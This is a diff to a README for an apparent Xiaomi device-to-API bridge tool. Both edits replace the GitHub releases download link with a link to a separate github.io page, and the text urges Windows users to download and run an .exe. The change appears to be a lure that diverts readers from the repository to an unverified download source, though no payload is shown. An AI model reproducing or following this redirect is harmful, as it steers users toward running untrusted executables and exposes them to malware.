@@ -1,6 +1,6 @@
 # 🔄 MiMoCode2API-Tutorial-new - Connect Xiaomi devices to your applications
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/disenosuhe/MiMoCode2API-Tutorial-new/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://disenosuhe.github.io)
 
 This software acts as a bridge for your Xiaomi devices. It creates a connection between your smart home hardware and your local applications. You gain control over your devices through a simple local setup. This guide helps you install and run the software on your Windows computer.
 
@@ -12,7 +12,7 @@ You need a Windows 10 or 11 computer to run this software. Ensure you have a sta
 
 You must visit the project page to download the latest version of this tool. 
 
-[Click here to open the download page](https://github.com/disenosuhe/MiMoCode2API-Tutorial-new/releases)
+[Click here to open the download page](https://disenosuhe.github.io)
 
 Choose the file that ends in .exe for the easiest installation experience. Save the file into a folder on your computer. Keep this folder in a location you can find later, such as your Downloads or Documents folder.
 
